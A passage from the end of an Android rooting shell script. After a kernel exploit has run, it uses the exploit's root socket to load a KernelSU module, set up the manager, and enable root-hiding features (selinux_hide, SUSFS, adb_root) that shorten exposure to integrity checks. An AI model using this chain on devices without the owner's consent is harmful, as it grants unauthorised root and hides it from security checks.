                    echo "98260_KSU_LATELOAD_PRIMARY_RC=$_primary_ll_rc" | tee -a "$KSU_LOG"
                else
                    echo "98260_KSU_LATELOAD_PRIMARY_RC=init_cred_insmod_failed" | tee -a "$KSU_LOG"
                    _primary_ll_rc=1
                fi
                sleep 1
                if [ "$_primary_ll_rc" = "0" ] && ksu_live; then
                    KSU_METHOD=ksud-late-load-primary
                    echo "98260_KSU_LATELOAD_PRIMARY_OK=1"
                fi
            fi
            echo "98260_KSU_ALLOW_SHELL=$ALLOW_SHELL_98260"
            if [ -z "$KSU_METHOD" ]; then
                printf 'mkdir -p /data/adb/ksu/lib && cp %s /data/adb/ksu/lib/%s_kernelsu.ko && chmod 644 /data/adb/ksu/lib/%s_kernelsu.ko\n' \
                    "$PATCHED" "$KMI" "$KMI" | "$SU" >> "$KSU_LOG" 2>&1
                KSU_METHOD=ksud-late-load
                printf 'export LD_LIBRARY_PATH="%s"; "%s" late-load --kmi "%s" --package-name "%s"%s\n' \
                    "$D" "$KSUD" "$KMI" "$MGR" "$KSU_ALLOW_ARG" | "$SU" >> "$KSU_LOG" 2>&1
                sleep 1
                if ! ksu_live; then
                    KSU_METHOD=insmod-fallback
                    printf 'insmod "%s"\n' "$PATCHED" | "$SU" >> "$KSU_LOG" 2>&1
                    sleep 1
                fi
            fi
            if ksu_live; then
                echo "98260_KSU=loaded method=$KSU_METHOD flavor=$KSU_FLAVOR_LOCAL"
            else
                echo "98260_KSU=failed method=$KSU_METHOD flavor=$KSU_FLAVOR_LOCAL log=$KSU_LOG"
            fi
        fi
    fi
else
    echo "98260_KSU=disabled"
fi

# The manager APK is deliberately not bundled.  Detect the selected manager
# so the UI can tell the user to install it; never auto-install a stale build.
_MGR_PKG=${MAGICROOT_KSU_PKG:-$(ksu_flavor_pkg "$KSU_FLAVOR_LOCAL" 2>/dev/null || true)}
if [ -n "${_MGR_PKG:-}" ]; then
    if pm path "$_MGR_PKG" >/dev/null 2>&1; then
        echo "98260_MANAGER_PRESENT=1 package=$_MGR_PKG"
    else
        echo "98260_MANAGER_PRESENT=0 package=$_MGR_PKG"
        echo "98260_MANAGER_HINT=install_selected_manager_from_apk_or_store"
    fi
fi

# Upstream-style manager userspace setup after handoff (best effort).  The
# 98260 reference runs `ksud install` and relaunches the manager after loading
# the LKM; keep it non-fatal because SELinux can make the rootd socket
# unreachable immediately after late-load.
if ksu_live && [ -n "${KSUD:-}" ] && [ -x "$KSUD" ]; then
    MGR_SETUP_LOG=$D/98260-manager.log
    : > "$MGR_SETUP_LOG" 2>/dev/null || true
    # libksud needs its bundled libadbroot for every install, not just the
    # preinstall.  The old post-install ran the bare binary and failed with
    # rc=1 after late-load, so the manager's su provider never appeared.
    _mgr_install_cmd="export LD_LIBRARY_PATH='$D'; '$KSUD' install --libadbroot '$D/libadbroot.so' --data-path /data/adb"
    if [ "${KSU_METHOD:-}" = "g264-cga" ] && [ -n "${KSUD:-}" ] && [ -x "$KSUD" ]; then
        # g264：rootd 已被模块切断，直接用 ksud debug su 安装管理器用户态
        echo "98260_KSUD_INSTALL_VIA=ksud-debug-su-first" >> "$MGR_SETUP_LOG"
        printf '%s\n' "$_mgr_install_cmd" | timeout 30 "$KSUD" debug su >> "$MGR_SETUP_LOG" 2>&1
        MGR_INSTALL_RC=$?
    elif command -v su >/dev/null 2>&1; then
        echo "98260_KSUD_INSTALL_VIA=su" >> "$MGR_SETUP_LOG"
        su -c "$_mgr_install_cmd" >> "$MGR_SETUP_LOG" 2>&1
        MGR_INSTALL_RC=$?
    else
        echo "98260_KSUD_INSTALL_VIA=rootd-c" >> "$MGR_SETUP_LOG"
        "$SU" -c "$_mgr_install_cmd" >> "$MGR_SETUP_LOG" 2>&1
        MGR_INSTALL_RC=$?
        if [ "$MGR_INSTALL_RC" != "0" ]; then
            echo "98260_KSUD_INSTALL_VIA=rootd-stdin-fallback" >> "$MGR_SETUP_LOG"
            printf '%s\n' "$_mgr_install_cmd" | "$SU" >> "$MGR_SETUP_LOG" 2>&1
            MGR_INSTALL_RC=$?
        fi
    fi
    echo "98260_KSUD_INSTALL_RC=$MGR_INSTALL_RC"
    if [ "$MGR_INSTALL_RC" != "0" ] && [ -n "${KSUD:-}" ] && [ -x "$KSUD" ]; then
        # g264 late-load 后 rootd 已被 SELinux 切断；用模块自己的 ksud debug su 重试
        echo "98260_KSUD_INSTALL_VIA=ksud-debug-su" >> "$MGR_SETUP_LOG"
        printf '%s\n' "$_mgr_install_cmd" | timeout 30 "$KSUD" debug su >> "$MGR_SETUP_LOG" 2>&1
        MGR_INSTALL_RC=$?
        echo "98260_KSUD_INSTALL_RETRY_RC=$MGR_INSTALL_RC"
    fi
    if [ "$MGR_INSTALL_RC" != "0" ]; then
        tail -20 "$MGR_SETUP_LOG" 2>/dev/null | sed 's/^/98260_KSUD_INSTALL_LOG=/' || true
    fi
    if [ "$MGR_INSTALL_RC" = "0" ]; then
        am force-stop "$MGR" >/dev/null 2>&1 || true
        monkey -p "$MGR" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1 || true
        echo "98260_MANAGER_REFRESHED=1 package=$MGR"
    fi
fi

# The manager's su provider may appear a few seconds after late-load/manager
# refresh.  Do not classify the rootd as unusable during that window.
if [ "$KSU_ENABLE" = "1" ] && ksu_live; then
    if [ "${KSU_METHOD:-}" = "g264-cga" ] && [ "$SU_COMPAT_98260" = "0" ]; then
        # STP compat: su_compat was forced off at insmod and the userspace su
        # overlay was skipped.  rootd/socket stays available for STP Clear.
        echo "98260_SU_PROVIDER=disabled reason=su_compat_off_load_time"
    elif [ "${KSU_METHOD:-}" = "g264-cga" ] && [ "${SU_SETUP_RC:-1}" = "0" ]; then
        # g264 的 su 在 /system_ext/bin overlay 里，不在 rootd/PATH；
        # 旧检查会空等 30 秒再报 unavailable，直接跳过。
        echo "98260_SU_PROVIDER=g264-overlay skip_rootd_wait=1"
    else
        wait_for_su_provider || true
    fi
fi

# KernelSU-Next ships a ksud binary with embedded per-KMI SUSFS guard assets.
# Use that official "complete ksud + guard" path when the selected backend is
# Next.  This is separate from the experimental branch .ko fallback; failures
# are non-fatal and are reported in the log.
# The Next manager embedded guard is not the hardened OnePlus-vendored
# 6.12/6.6 build; only load it with explicit opt-in.
_SUSFS_ENABLED=${SUSFS_ENABLE:-${SUSFS_SWITCH:-0}}
if [ "$_SUSFS_ENABLED" = "1" ] && [ "$KSU_FLAVOR_LOCAL" = "next" ] &&
   [ "${MAGICROOT_SUSFS_NEXT_EMBEDDED:-1}" = "1" ] &&
   [ -n "${KSUD:-}" ] && [ -x "$KSUD" ] &&
   ! _susfs_loaded; then
    _susfs_ksud_log=$D/98260-susfs-ksud.log
    : > "$_susfs_ksud_log" 2>/dev/null || true
    echo "SUSFS_KSUD_EMBEDDED_LOAD_BEGIN kmi=$KMI path=$KSUD"
    _susfs_ksud_cmd="'$KSUD' susfs load --kmi '$KMI'"
    if [ -n "${KSU_SU_PROVIDER:-}" ] && [ -x "$KSU_SU_PROVIDER" ]; then
        "$KSU_SU_PROVIDER" -c "$_susfs_ksud_cmd" >> "$_susfs_ksud_log" 2>&1
        _susfs_ksud_rc=$?
    elif command -v su >/dev/null 2>&1; then
        su -c "$_susfs_ksud_cmd" >> "$_susfs_ksud_log" 2>&1
        _susfs_ksud_rc=$?
    elif [ -x /data/adb/ksu/bin/su ]; then
        /data/adb/ksu/bin/su -c "$_susfs_ksud_cmd" >> "$_susfs_ksud_log" 2>&1
        _susfs_ksud_rc=$?
    else
        "$SU" -c "$_susfs_ksud_cmd" >> "$_susfs_ksud_log" 2>&1
        _susfs_ksud_rc=$?
    fi
    echo "SUSFS_KSUD_EMBEDDED_LOAD_RC=$_susfs_ksud_rc"
    tail -n 12 "$_susfs_ksud_log" 2>/dev/null || true
    if _susfs_wait_loaded; then
        echo "SUSFS_KSUD_EMBEDDED_LOADED=1 rc=$_susfs_ksud_rc verify=module_or_proc"
    else
        echo "SUSFS_KSUD_EMBEDDED_LOADED=0 rc=$_susfs_ksud_rc reason=no_module_or_proc_after_wait"
    fi
fi

# If su_compat is disabled, remove the KSU /system/bin/su shim as early as
# possible (after manager userspace setup, before su_entry).  This reduces the
# STP check-su exposure window and makes su_entry exercise its /data/adb path.
if [ "$SU_COMPAT_98260" = "0" ] && [ "$SU_ENTRY_98260" != "1" ] && [ "$KSU_ENABLE" = "1" ] && ksu_live; then
    FEATURE_EARLY="${KSUD:-/data/adb/ksud}"
    [ -x "$FEATURE_EARLY" ] || FEATURE_EARLY=/data/adb/ksud
    if command -v su >/dev/null 2>&1; then
        su -c "$FEATURE_EARLY feature set su_compat 0" >>"$D/98260-features.log" 2>&1
    else
        "$SU" -c "$FEATURE_EARLY feature set su_compat 0" >>"$D/98260-features.log" 2>&1
    fi
    echo "98260_SU_COMPAT_EARLY=0 rc=$?"
fi

# Default su entry for the 98260 chain.  The 64560 root_stage executes
# su_entry.sh; the 98260 handoff previously ignored MAGICROOT_SU_ENTRY.
# Run it after KSU/manager setup, through the KSU su when available or through
# the still-live rootd client otherwise.  Non-fatal.
if [ "$SU_ENTRY_98260" = "1" ] && [ "${KSU_METHOD:-}" = "g264-cga" ] && [ "${SU_SETUP_RC:-1}" = "0" ]; then
    # g264 的 su 由 su_lkm overlay 提供，su_entry 的 rootd 路径已不可用
    echo "98260_SU_ENTRY=skipped reason=g264_overlay_su"
elif [ "$SU_ENTRY_98260" = "1" ] && [ "$KSU_ENABLE" = "1" ] && ksu_live && [ -f "$D/su_entry.sh" ]; then
    chmod 755 "$D/su_entry.sh" 2>/dev/null || true
    SU_ENTRY_LOG=$D/98260-su-entry.log
    : > "$SU_ENTRY_LOG" 2>/dev/null || true
    if command -v su >/dev/null 2>&1; then
        su -c "sh $D/su_entry.sh" >> "$SU_ENTRY_LOG" 2>&1
        SU_ENTRY_RC=$?
    else
        "$SU" -c "sh $D/su_entry.sh" >> "$SU_ENTRY_LOG" 2>&1
        SU_ENTRY_RC=$?
    fi
    cat "$SU_ENTRY_LOG" 2>/dev/null || true
    echo "98260_SU_ENTRY_RC=$SU_ENTRY_RC"
elif [ "$SU_ENTRY_98260" = "1" ] && { [ "$KSU_ENABLE" != "1" ] || ! ksu_live; }; then
    echo "98260_SU_ENTRY=skipped reason=ksu_disabled_or_not_loaded"
elif [ "$SU_ENTRY_98260" = "1" ]; then
    echo "98260_SU_ENTRY=skipped reason=missing_script"
else
    echo "98260_SU_ENTRY=disabled"
fi

if [ "${MAGICROOT_KEEP_ROOTD:-0}" = "1" ] || [ -f "$D/.keep-rootd-user" ]; then
    # STP compat / user opt-in: keep the listener socket for full-cap STP Clear.
    echo "98260_ROOTD_SOCKET=kept reason=user_keep"
elif [ "$KSU_ENABLE" = "1" ] && ksu_live && [ "${KSU_METHOD:-}" = "g264-cga" ] && [ "${SU_SETUP_RC:-1}" = "0" ]; then
    # g264 的 su 在 /system_ext/bin overlay；不再用 rootd 做 KSU_UID/清理
    echo "98260_ROOTD_SOCKET=kept reason=g264_overlay_su"
elif [ "$KSU_ENABLE" = "1" ] && ksu_live; then
    KSU_UID=""
    if command -v su >/dev/null 2>&1; then
        KSU_UID=$(su -c 'id -u' 2>/dev/null | tr -d ' \r\n')
    elif [ -x /data/adb/ksu/bin/su ]; then
        KSU_UID=$(/data/adb/ksu/bin/su -c 'id -u' 2>/dev/null | tr -d ' \r\n')
    fi
    if [ "$KSU_UID" = "0" ]; then
        # Do not SIGKILL the plant: killing its parent reparents a timer-UAF
        # zombie to init, which panics (posix_cpu_timers_exit/rb_next).
        if command -v su >/dev/null 2>&1; then
            su -c "rm -f '$SOCK'" 2>/dev/null || true
        else
            /data/adb/ksu/bin/su -c "rm -f '$SOCK'" 2>/dev/null || true
        fi
        echo "98260_ROOTD_SOFT_CLEANED=1 reason=zombie_reap_panic"
    else
        # Shell can unlink the socket even when no su provider is usable.
        # Keep the exploit parent alive (zombie-reap panic), but remove the
        # accessible rootd service.  Do not call this "kept" if unlink worked.
        rm -f "$SOCK" /data/local/tmp/pc98260-root2.sock 2>/dev/null || true
        if [ ! -S "$SOCK" ]; then
            echo "98260_ROOTD_SOCKET_CLEANED=1 reason=no_working_su parked=1 uid=${KSU_UID:-unknown}"
        else
            echo "98260_ROOTD_KEPT reason=no_working_su socket_remove_denied uid=${KSU_UID:-unknown}"
        fi
    fi
else
    echo "98260_ROOTD_KEPT reason=auto_ksu_disabled_or_not_loaded"
fi


# Rootd cleanup has already run above; feature switches may now safely disable
# su_compat without making KSU_UID/cleanup fail.

# Upstream-style cleanup: only after normal su works.  Never kill the plant
# merely because the module is loaded; a broken su would lose the fallback.
# KernelSU feature switches for the 98260 handoff.  These are the same
# ksud feature names used by the 64560 root_stage path.
if [ "$KSU_ENABLE" = "1" ] && ksu_live; then
    FEATURE_LOG=$D/98260-features.log
    : > "$FEATURE_LOG" 2>/dev/null || true
    FEATURE_KSUD="${KSUD:-/data/adb/ksud}"
    [ -x "$FEATURE_KSUD" ] || FEATURE_KSUD=/data/adb/ksud
    feature_set_98260() {
        _f_name="$1"
        _f_value="$2"
        if [ "${KSU_METHOD:-}" = "g264-cga" ] && [ -x "$FEATURE_KSUD" ]; then
            printf '%s\n' "$FEATURE_KSUD feature set $_f_name $_f_value" | timeout 10 "$FEATURE_KSUD" debug su >> "$FEATURE_LOG" 2>&1
        elif command -v su >/dev/null 2>&1; then
            su -c "$FEATURE_KSUD feature set $_f_name $_f_value" >> "$FEATURE_LOG" 2>&1
        else
            "$SU" -c "$FEATURE_KSUD feature set $_f_name $_f_value" >> "$FEATURE_LOG" 2>&1
        fi
        _f_rc=$?
        echo "98260_FEATURE_${_f_name}=${_f_value} rc=${_f_rc}"
    }
    feature_set_98260 kernel_umount "$KERNEL_UMOUNT_98260"
    feature_set_98260 selinux_hide "$SELINUX_HIDE_98260"
    feature_set_98260 adb_root "$ADB_ROOT_98260"
    feature_set_98260 su_compat "$SU_COMPAT_98260"
    if [ "$ADB_ROOT_98260" = "1" ]; then
        if command -v su >/dev/null 2>&1; then
            su -c "setprop ctl.restart adbd" >> "$FEATURE_LOG" 2>&1 || true
        else
            printf 'setprop ctl.restart adbd\n' | "$SU" >> "$FEATURE_LOG" 2>&1 || true
        fi
        echo "98260_ADB_ROOT=1 adbd_restart=requested"
    else
        echo "98260_ADB_ROOT=0"
    fi
fi

# Safety guard for the manager's "soft reboot" menu item.  FinaSU uses
# ksud soft-reboot, which resets sys.boot_completed, runs `stop`, then `start`;
# on this late-load KSU that stop/start can be turned into a cold reboot by the
# Honor watchdog.  ksud takes an exclusive flock on this path *before* stop.
# A directory makes that open/flock fail early, so the manager aborts safely
# instead of reaching the dangerous stop/start.  Remove the directory to
# re-enable real soft reboot; full reboot is unaffected.
if [ "${MAGICROOT_SOFT_REBOOT_GUARD:-0}" = "1" ]; then
    _sg_su=""
    if command -v su >/dev/null 2>&1; then
        _sg_su="su"
    elif [ -x /system/bin/su ]; then
        _sg_su=/system/bin/su
    elif [ -x /data/adb/ksu/bin/su ]; then
        _sg_su=/data/adb/ksu/bin/su
    fi
    if [ -n "$_sg_su" ]; then
        "$_sg_su" -c 'rm -rf /data/adb/ksu/soft_reboot.lock; mkdir -p /data/adb/ksu/soft_reboot.lock; chmod 700 /data/adb/ksu/soft_reboot.lock' >/dev/null 2>&1
        # /data/adb is not necessarily searchable by the outer uid-2000 shell.
        # Verify through the same root provider that created the guard.
        if "$_sg_su" -c 'test -d /data/adb/ksu/soft_reboot.lock' >/dev/null 2>&1; then
            echo "SOFT_REBOOT_GUARD=armed path=/data/adb/ksu/soft_reboot.lock mode=lock_dir verified=root"
        else
            echo "SOFT_REBOOT_GUARD=arm_failed verified=root"
        fi
    else
        echo "SOFT_REBOOT_GUARD=skip reason=no_su_provider"
    fi
else
    # Guard is opt-in only.  Remove the directory form left by older builds;
    # otherwise FinaSU's ksud soft-reboot always fails before stop/start and
    # Zygisk modules never get their post-fs-data/services pass.
    _sg_su=""
    if command -v su >/dev/null 2>&1; then
        _sg_su="su"
    elif [ -x /system/bin/su ]; then
        _sg_su=/system/bin/su
    elif [ -x /data/adb/ksu/bin/su ]; then
        _sg_su=/data/adb/ksu/bin/su
    fi
    if [ -n "$_sg_su" ] && "$_sg_su" -c 'test -d /data/adb/ksu/soft_reboot.lock' >/dev/null 2>&1; then
        "$_sg_su" -c 'rm -rf /data/adb/ksu/soft_reboot.lock' >/dev/null 2>&1
        if "$_sg_su" -c 'test -d /data/adb/ksu/soft_reboot.lock' >/dev/null 2>&1; then
            echo "SOFT_REBOOT_GUARD=disabled cleanup_failed path=/data/adb/ksu/soft_reboot.lock"
        else
            echo "SOFT_REBOOT_GUARD=disabled cleaned_old_lock_dir"
        fi
    else
        echo "SOFT_REBOOT_GUARD=disabled"
    fi
fi

# Do not leave the device Permissive if KSU did not load (the last run did:
# missing=15 => Permissive shell with no su).  Restore Enforcing through the
# still-live rootd before reporting chain completion.
if [ "$KSU_ENABLE" = "1" ] && ! ksu_live; then
    _enforce_after=""
    if [ -x "$SU" ]; then
        _enforce_after=$("$SU" -c 'setenforce 1 2>/dev/null; getenforce' 2>/dev/null | /system/bin/tail -1)
    else
        setenforce 1 2>/dev/null || true
        _enforce_after=$(getenforce 2>/dev/null)
    fi
    case "$_enforce_after" in
        Enforcing) echo "98260_SELINUX_RESTORED=1 reason=ksu_failed" ;;
        *) echo "98260_SELINUX_RESTORE_FAIL=1 current=${_enforce_after:-unknown} reason=ksu_failed; reboot required" ;;
    esac
fi

# 6.1.157 专版：root 拿到但 KSU 没起来不能报 DONE，否则 App 会显示成功。
if [ "$K6157" = "1" ] && [ "$KSU_ENABLE" = "1" ] && [ "${KSU6157_OK:-0}" != "1" ] && ! ksu_live; then
    sig_restore_6157
    echo "98260_CHAIN_END=ROOT_OK_KSU_FAIL code=82"
    exit 82
fi
printf '%s' "$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)" > "$D/.98260-success" 2>/dev/null
echo "98260_SUCCESS=1 reused=0"
echo "98260_EXEC_PID=$EXEC_PID"
echo "98260_ROOTD_SOCK=$SOCK"
echo "98260_SU=$SU"
echo "98260_CHAIN_END=OK"

exit 0
